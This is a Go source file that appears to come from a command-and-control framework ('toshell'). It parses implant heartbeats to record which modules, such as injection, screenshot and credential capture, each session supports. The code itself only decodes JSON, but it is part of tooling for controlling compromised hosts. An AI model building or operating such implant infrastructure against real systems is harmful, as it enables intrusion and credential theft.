package listener

import (
	"encoding/json"

	"toshell/internal/common/protocol"
	"toshell/internal/server/session"
)

// applyHeartbeatModules 从心跳负载里取出植入端上报的能力位并写回会话。
//
// 为什么需要这一步：心跳负载历史上只是 `{"Status":"alive","CPUUsage":0,"MemoryUsed":0}`
// 这样的常量 JSON，各通道的心跳处理只刷新 LastSeen、**从不解析负载** ——
// 于是 SessionInfo.ActiveModules 恒为空，/sessions/{id}/capabilities 只能按 OS 兜底猜，
// 用 light 档构建的载荷在控制台上照样显示注入/截图/凭据按钮（点了没反应）。
//
// 这里只解析 Modules、只在真的变化时落库（心跳默认 5s 一次，见
// session.Manager.SetActiveModules 的说明）。解析失败/没有 Modules 一律静默返回：
// 老载荷没有这个字段，心跳的其他语义（保活）不能受影响。
func applyHeartbeatModules(mgr *session.Manager, sessionID string, payload []byte) {
	if mgr == nil || sessionID == "" || len(payload) == 0 {
		return
	}
	var hb protocol.Heartbeat
	if err := json.Unmarshal(payload, &hb); err != nil {
		return
	}
	mgr.SetActiveModules(sessionID, hb.Modules)
}
